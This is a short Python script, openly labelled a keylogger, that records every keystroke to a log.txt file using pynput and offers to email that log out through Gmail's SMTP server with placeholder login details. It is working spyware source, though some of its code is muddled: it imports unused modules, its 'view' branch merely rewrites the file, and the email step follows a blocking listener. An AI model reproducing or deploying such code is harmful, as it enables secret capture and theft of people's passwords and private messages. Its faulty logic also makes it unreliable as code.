# the below script is a keylogger sending the keystrokes to a file with pyautogui and pynput
# it is also sending the keystrokes to a file with pynput and keyboard
# is is also sending the file called log.txt to the same directory as the script
# it is also sending the file log.txt to the email specified in the script
# Import the necessary modules
import pyautogui
from pynput import keyboard
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


# Define a function to write the pressed key to a file
def on_press(key):
    try:
        # If the key is a normal character, write it to the file
        current_key = str(key.char)
    except AttributeError:
        # If the key is a special key, write it to the file with spaces around it
        if key == keyboard.Key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    with open('log.txt', 'a') as f:
        f.write(current_key)

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# ask the owner if he want to send the file to the email or to view it
send_to_email = input("Do you want to send the file to the email? (y/n)")
if send_to_email == "y":
    # send the file to the email specified in the script
    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login('email', 'password')
        smtp.sendmail('email', 'email', open('log.txt', 'rb').read())
        print("The file has been sent to the email")
elif send_to_email == "n":
    # view the file
    with open('log.txt', 'rb') as f:
        file_data = f.read()
    file_name = 'log.txt'
    with open(file_name, 'wb') as f:
        f.write(file_data)
    print("The file has been saved")
else:
    print("Invalid input")


